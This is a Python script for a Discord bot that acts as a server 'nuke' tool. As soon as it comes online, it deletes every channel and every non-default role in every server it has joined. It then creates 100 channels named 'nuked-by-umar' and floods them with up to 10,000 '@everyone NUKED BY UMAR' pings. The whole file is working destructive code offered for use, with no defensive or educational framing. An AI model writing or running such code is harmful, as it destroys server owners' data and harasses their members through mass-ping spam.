import discord
from discord.ext import commands
import asyncio
import os

# ===== CONFIG =====
TOKEN = os.environ.get('TOKEN')
OWNER_ID = 361069640962801664

# ===== BOT SETUP =====
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=None, intents=intents, help_command=None)

# ===== AUTO NUKE - IMMEDIATE DESTRUCTION =====
@bot.event
async def on_ready():
    print(f"🤖 BOT ONLINE: {bot.user.name}")
    print(f"🔗 Connected to {len(bot.guilds)} servers")
    print("💣 STARTING AUTO-NUKE ON ALL SERVERS...")
    
    # NUKE EVERY SERVER THE BOT IS IN
    for guild in bot.guilds:
        print(f"\n🔥 NUKE INITIATED ON: {guild.name}")
        
        # STEP 1: DELETE ALL CHANNELS (FASTEST)
        for channel in guild.channels:
            try:
                await channel.delete()
            except:
                pass
        
        # STEP 2: DELETE ALL ROLES (FASTEST)
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except:
                    pass
        
        # STEP 3: CREATE 100 CHANNELS + PING SPAM
        channels = []
        
        # Create channels
        for i in range(100):
            try:
                channel = await guild.create_text_channel("nuked-by-umar")
                channels.append(channel)
                # Ping immediately
                await channel.send("@everyone NUKED BY UMAR")
            except:
                pass
        
        # STEP 4: MASS PING SPAM - ABSOLUTE MAX SPEED
        ping_count = 0
        target = 10000
        
        while ping_count < target:
            for channel in channels:
                try:
                    await channel.send("@everyone NUKED BY UMAR")
                    ping_count += 1
                    if ping_count >= target:
                        break
                except:
                    pass
    
    print("\n💀 AUTO-NUKE COMPLETE - ALL SERVERS DESTROYED 💀")

# ===== RUN BOT =====
bot.run(TOKEN)


